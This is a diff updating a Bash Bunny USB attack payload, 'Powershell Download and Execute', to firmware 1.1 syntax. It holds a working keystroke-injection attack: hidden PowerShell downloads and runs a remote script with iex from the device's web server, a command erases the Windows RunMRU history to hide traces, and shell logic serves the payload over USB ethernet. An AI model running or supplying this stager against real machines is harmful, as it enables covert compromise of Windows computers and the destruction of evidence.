@@ -2,22 +2,24 @@
 #
 # Title:         Powershell Download and Execute
 # Author:        LowValueTarget
-# Version:       1.0
+# Version:       1.1
 # Category:      Powershell
 # Target:        Windows XP SP3+ (Powershell)
-# Attackmodes:   HID, Ethernet
+# Attackmodes:   HID, RNDIS_ETHERNET
+# Firmware:      >= 1.1
 # 
+# OPTIMIZED FOR BASHBUNNY 1.1_x+
+#
 # Quick HID attack to retrieve and run powershell payload from BashBunny web server - ensure psh.txt exists in payload directory
 # 
-# Amber Blink Fast.....Initialization
-# Red..................No psh.txt present in payload directory (powershell payload)
-# Blue Blink Fast......HID Stage
-# White Blink..........Ethernet Stage
-# White Blink Fast.....Web server started
-# Green................Finished
+# | Attack Stage        | Description                              |
+# | ------------------- | ---------------------------------------- |
+# | Stage 1             | Running Initial Powershell Commands      |
+# | Stage 2             | Turning up web server and DHCP           |
+# | Stage 3             | Delivering powershell payload            |
 #
-LED R G 100
-source bunny_helpers.sh
+
+LED SETUP
 
 # Set working dir
 PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
@@ -31,30 +33,22 @@ echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
 
 # Check for psh.txt
 if [ ! -f $PAYLOAD_DIR/psh.txt ]; then
-    LED R
+    LED FAIL
     exit 1
 fi
 
 # Attack HID
 ATTACKMODE HID
-LED B 100
+LED STAGE1
 
-Q GUI r
-Q DELAY 500
-# Wait for IP then download powershell script and run it
-Q STRING "powershell -WindowStyle Hidden \"while (\$TRUE) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { iex (New-Object Net.WebClient).DownloadString('http://172.16.64.1/psh.txt'); Invoke-WebRequest 'http://172.16.64.1/COMPLETE'; exit } }\""
-Q ENTER
+# Attack
+RUN WIN "powershell -WindowStyle Hidden \"while (\$TRUE) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { iex (New-Object Net.WebClient).DownloadString('http://172.16.64.1/psh.txt'); (New-Object Net.WebClient).DownloadString('http://172.16.64.1/COMPLETE'); exit } }\""
 
-# Ninja vanish
-Q DELAY 500
-Q GUI r
-Q DELAY 500
-# Clear recent run history
-Q STRING "powershell -WindowStyle Hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""
-Q ENTER
+# Wipe prints
+RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""
 
 # Attack Ethernet
-LED R G B 500
+LED STAGE2
 ATTACKMODE RNDIS_ETHERNET
 
 # Start web server
@@ -63,12 +57,13 @@ python -m SimpleHTTPServer 80 > $SERVER_LOG 2>&1 &
 
 # wait until python web server is listening
 while ! nc -z localhost 80; do sleep 0.2; done
+
 # Re-enable ICMP/echo replies to trip the powershell stager
 echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
-LED R G B 100
+LED STAGE3
 
 while ! grep -Fq "GET /COMPLETE" $SERVER_LOG; do
     sleep .5
 done
 
-LED G
+LED FINISH
